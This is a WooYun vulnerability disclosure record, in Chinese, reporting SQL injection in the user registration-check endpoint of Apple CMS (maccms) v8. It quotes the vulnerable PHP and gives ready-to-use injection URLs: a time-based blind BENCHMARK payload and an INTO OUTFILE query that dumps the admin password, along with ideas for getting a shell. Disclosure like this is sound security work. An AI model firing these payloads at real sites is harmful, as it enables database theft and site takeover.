{"id": 53909, "wybug_id": "wooyun-2014-066102", "wybug_title": "苹果CMS继续无视所有过滤进行SQL注入，第二发", "wybug_corp": "maccms.com", "wybug_author": "magerx", "wybug_date": "2014-06-24 19:46", "wybug_open_date": "2014-09-22 19:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-28：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-22：\t细节向公众公开  简要描述： 这次这个地方主要是想绕过一个限制达到getshell的目的，但是本人水平有限，所以希望大家可以讨论下。 详细说明：  估计依旧小厂商，当然这倒不要紧。继续上次的注入，如果说上次是因为单词写错的缘故，这次就不仅仅是粗心所造成的了。接着看代码：同样index.php开头：上次分析过，这次直接看\nif(empty($ac)){ $ac='vod'; $method='index'; }        $colnum = array(\"id\",\"pg\",\"yaer\",\"typeid\",\"classid\");//依然是这里    if($parlen>=2){    \t$method = $par[1];    \t for($i=2;$i<$parlen;$i+=2){            $tpl->P[$par[$i]] = in_array($par[$i],$colnum) ? intval($par[$i+1]) : urldecode($par[$i+1]);        }    }    if($tpl->P['pg']<1){ $tpl->P['pg']=1; }    unset($colnum);    $acs = array('vod','art','map','user','gbook','comment','label');    if(in_array($ac,$acs)){    \t$tpl->P[\"module\"] = $ac;    \tinclude MAC_ROOT.'/inc/module/'.$ac.'.php';//继续看module下的文件    }    else{    \tshowErr('System','未找到指定系统模块');    }\n为了避免说是刷漏洞之类的，我们这次看/inc/module/user.php:第152行\nelseif($method=='regcheck'){\t$status=\"true\";\t$s=$tpl->P['s'];//s是哪里来的呢\t$t=$tpl->P['t'];//t就是哪里来的\tswitch($t)//我们看到下面$s依然没有做任何过滤，同时我们之前就可以绕过一切防护\t{\t\tcase \"u_name\": $where = \" AND u_name='\" .$s .\"'\";break;\t\tcase \"u_email\": $where = \" AND u_email='\" . $s .\"'\";break;\t\tcase \"u_qq\": $where = \" AND u_qq='\" . $s .\"'\";break;\t\tcase \"u_code\": if ($_SESSION[\"code_userreg\"] != $s){ $status=\"false\"; } break;\t\tdefault : $where=\"\";break;\t}\tif($t!=\"u_code\" && $status==\"true\"){//也就是说$t为u_name,u_email,u_qq时都可以注入了\t\t$sql = \"SELECT count(*) FROM {pre}user WHERE 1=1 \" . $where;\t\t$num = $db->getOne($sql);\t\tif($num>0){ $status= \"false\"; }\t}\techo \"{\\\"res\\\":\".$status.\"}\";;}\n不知道开发看到这里有没有明白各种漏洞为什么会产生呢～注入比较简单，但这里我们却只能延时注入，来看下mysql_log:\n\n当然这里你无法union，只能基于时间盲注入，配合IF和BENCHMARK你依然可以读数据，但总觉得不够满足，一直想getshell，所以不管如何先找到路径，看了下代码也没找到好的爆路径的地方，只好野蛮一点：\nhttp://localhost/maccms8_mfb/index.php?m=user-regcheck-s-123%2527%2520and%2520BENCHMARK%252850000000%250A%252Cmd5%2528%2527test%2527%2529%2529%2523-t-u_name\n\n\n得到路径了，但是index.php里的一段代码让我瞬间傻了，\n$m = be('get','m');    if(strpos($m,'.')){ $m = substr($m,0,strpos($m,'.')); }\n也就是说其实传来的参数只会获取第一个点号出现之前的部分，那我们怎么getshell啊，愁死了，接下来我就开始各种YY:1.读取密码写入无后缀文件中：【可是这样你无法下载啊】\nhttp://localhost/maccms8_mfb/index.php?m=user-regcheck-s-123%2527%2520union%2520select%2520m_password%2520from%2520mac_manager%2520into%2520outfile%2520%2522C%253A%255C%255CAppServ%255C%255Cwww%255C%255Cmaccms8_mfb%255C%255Cinc%255C%255Ccommon%255C%255Ctest%2522%2523-t-u_name\n\n\n2.利用NTFS ADS建立目录，类似\nselect 'xxx' into dumpfile 'f:\\\\test::$INDEX_ALLOCATION';\n可是这又能干嘛3.继续YY,可不可以以16进制方式写入路径到无后缀文件，然后再outfile到读取出来的路径中，死心吧，语法压根不可行。4.mysql有能像oracle那样远程将数据发送到其他服务器的函数么，哎继续死心5.还是老老实实挖一个文件包含吧…………求大家支援   漏洞证明：  \n\n\n\n\n\n   修复方案：  ～。～   版权声明：转载请注明来源 magerx@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-06-25 17:30 厂商回复： 看来360防护脚本防护的补全面啊，改进一下。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}